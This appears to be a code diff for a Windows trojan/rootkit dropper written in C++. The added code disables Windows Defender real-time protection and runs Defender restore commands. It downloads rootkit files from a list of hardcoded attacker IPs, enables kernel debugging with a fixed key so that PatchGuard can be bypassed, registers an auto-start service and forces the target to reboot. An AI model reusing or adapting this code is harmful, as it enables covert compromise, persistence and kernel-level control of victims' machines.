@@ -1,7 +1,8 @@
+#include "networking.h"
 #include <iostream>
 #include <random>
 #include <string>
-#include "networking.h"
+#include <shlobj_core.h>
 #include "configurations.h"
 #include "services.h"
 
@@ -15,39 +16,73 @@ std::wstring GetCurrentPath() {
 
 
 BOOL TrojanThread(LPVOID TrojParams) {
-    std::wstring CurrPath = GetCurrentPath();  // exe path, not solution path / source file path
-    std::wstring WideAutoService(L"C:\\nosusfolder\\verysus\\AutoService\\AutoStart.exe");
-
+    const char* CleaningCommands =
+        "cd \"%ProgramFiles%\\Windows Defender\" && "
+        "MpCmdRun.exe -Restore -All";
     char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     char DebugPort[MAX_PORT_SIZE] = { 0 };
     char DebugKey[MAX_DEBUGKEY_SIZE] = { 0 };
-    char AutoPath[MAX_PATH] = { 0 };
-    char MapperName[13] = "RootMapper";
-    RootService AutoService;
     RETURN_LAST LastError = { 0, ERROR_SUCCESS };
-    WcharpToCharp(AutoPath, WideAutoService.c_str());
     ParseTrojanParams(TrojParams, TargetIp, AttackerIp, DebugPort, DebugKey);
 
 
-    // Disable realtime protection to not trigger any virus checks/alerts -
+    // Disable realtime protection to not trigger any virus checks/alerts:
     LastError = RealTime(TRUE);
     if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
-        printf("[-] Cannot disable realtime protection - %d\n", LastError.LastError);
+        printf("Cannot disable realtime protection - %d\n", LastError.LastError);
         return FALSE;
     }
+    printf("Disabled realtime protection\n");
 
-    // Get all the needed files for the rootkit (would eventually be medium.exe and driver files) and configure remote debugging -
+
+    // Run cleaning commands for last iteration:
+    if (system(CleaningCommands) == -1) {
+        printf("Failed to perform cleaning commands: %d\n", GetLastError());
+        return FALSE;
+    }
+    printf("Performed cleaning commands successfully\n");
+
+
+    // Get all the needed files for the rootkit (would eventually be medium.exe and driver files) and configure remote debugging:
     if (!FilesAndDebugging(AttackerIp, DebugPort, DebugKey)) {
         return FALSE;
     }
     printf("Downloaded files and changed debugging settings\n");
 
-    if (!SignAsService(AutoPath, &AutoService, "RootAuto", SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, ".exe")) {
-        printf("[-] Failed to create service entry for auto service!\n");
+
+    // Disable patchguard:
+    if (system("bcdedit /debug ON") == -1) {
+        printf("Failed to run KPP disabler: %d\n", GetLastError());
+    }
+    printf("ran KPP disabler successfully\n");
+
+
+    // Enable RealTime Protection:
+    LastError = RealTime(FALSE);
+    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
+        printf("Failed to enable realtime protection: %d\n", LastError.LastError);
         return FALSE;
     }
-    printf("Created service for auto service\n");
+    printf("Enabled realtime protection\n");
+
+
+    // Create temporary service for AutoService:
+    system("sc stop RootAuto");
+    system("sc delete RootAuto");
+    if (system("sc create RootAuto type=own start=auto binPath=\"C:\\nosusfolder\\verysus\\AutoStart.exe\"") == -1) {
+        printf("Failed to create auto service: %d\n", GetLastError());
+        return FALSE;
+    }
+    printf("Created auto service\n");
+
+
+    // Forcefully restart machine:
+    if (system("shutdown -r -f") == -1) {
+        printf("Failed to force reset the target: %d\n", GetLastError());
+        return FALSE;
+    }
+    printf("Resetting target..\n");
     return TRUE;
 }
 
@@ -63,9 +98,9 @@ int main()
     char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
 
      // HARDCODED VALUES, CHANGE THIS BY ListAttacker IF NEEDED
-    const char* AttackAddresses = "172.25.112.1~172.31.240.1~172.23.144.1~172.23.224.1~172.26.192.1~172.17.160.1~172.27.144.1~192.168.47.1~192.168.5.1~192.168.1.21~172.28.224.1~192.168.56.1";
-    const char* DebugPort = "50098";
-    const char* DebugKey = "7DY7NXTWOM9I.3BM9J5ZCB6EI.CMVKI54LP3U.NUS6VXQK8WEB";
+    const char* AttackAddresses = "172.25.224.1~172.29.32.1~172.20.32.1~172.20.240.1~172.27.144.1~172.28.112.1~172.17.96.1~192.168.47.1~192.168.5.1~192.168.1.21~172.21.64.1~192.168.56.1~192.168.40.1";
+    const char* DebugPort = "50003";
+    const char* DebugKey = "7DY7NXTWOM9I.3BM9J5ZCB6EI.CMVKI54LP3U.NUS6VXQK1111";
 
     const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,/;[]{}:-_=+)(*&^%$#@!~`";
     std::random_device rd;
